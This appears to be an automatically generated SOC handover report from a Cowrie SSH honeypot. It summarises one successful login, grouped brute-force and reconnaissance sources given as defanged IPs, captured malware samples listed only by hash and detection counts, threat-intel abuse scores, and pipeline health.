### 🔴 HIGH · IR-5a833b3d18f3

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:54 |
| **Last Seen** | 2026-05-24 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:54:42` | `cowrie.session.connect` |
| `2026-05-24 09:54:42` | `cowrie.client.version` |
| `2026-05-24 09:54:43` | `cowrie.client.kex` |
| `2026-05-24 09:54:43` | `cowrie.login.success` |
| `2026-05-24 09:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `72.255.33[.]38` | **23** | 2026-05-24 07:57 | 2026-05-24 08:02 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `40.83.182[.]122` | **13** | 2026-05-24 09:06 | 2026-05-24 09:54 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.243.0[.]62` | **9** | 2026-05-24 09:18 | 2026-05-24 09:54 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | **4** | 2026-05-24 07:43 | 2026-05-24 09:14 | 4m | 0 | `T1592` | 🟢 LOW |
| `47.251.126[.]221` | **4** | 2026-05-24 09:54 | 2026-05-24 09:55 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `87.226.190[.]225` | **3** | 2026-05-24 09:12 | 2026-05-24 09:20 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `128.203.200[.]216` | **2** | 2026-05-24 09:11 | 2026-05-24 09:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `166.62.92[.]145` | **2** | 2026-05-24 09:29 | 2026-05-24 09:39 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.51.149[.]254` | 1 | 2026-05-24 09:50 | 2026-05-24 09:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]48` | 1 | 2026-05-24 07:27 | 2026-05-24 07:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.115[.]202` | 1 | 2026-05-24 09:51 | 2026-05-24 09:52 | 98s | 0 | `T1592` | 🟢 LOW |
| `197.251.249[.]72` | 1 | 2026-05-24 07:33 | 2026-05-24 07:34 | 16s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]74` | 1 | 2026-05-24 09:00 | 2026-05-24 09:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]98` | 1 | 2026-05-24 09:00 | 2026-05-24 09:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]236` | 1 | 2026-05-24 08:36 | 2026-05-24 08:36 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `197.251.249[.]72` | GH | Ghana Telecommunications Company Limited | **100** ⚠️ | 14 |
| `31.14.254[.]98` | GB | Infrawatch Limited | **100** ⚠️ | 9 |
| `31.14.254[.]74` | GB | Infrawatch Limited | **100** ⚠️ | 9 |
| `166.62.92[.]145` | US | GoDaddy.com, LLC | **100** ⚠️ | 6 |
| `128.203.200[.]216` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `66.132.224[.]236` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `47.251.126[.]221` | US | Alibaba Cloud - US | **100** ⚠️ | 13 |
| `87.226.190[.]225` | RU | ISP Leased lines, cable operator, WWW, FTP, E-Mail servers | **100** ⚠️ | 11 |
| `101.96.202[.]48` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 9 |
| `197.243.0[.]62` | RW | Broadband Systems Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 46 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 26 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 5 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 101 cases |
| Tool 34  | Credential Extractor        | ✅ 41 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (19.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 15 recon entry/entries in table (8 group(s) consolidating 60 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-24T09:59:24Z_
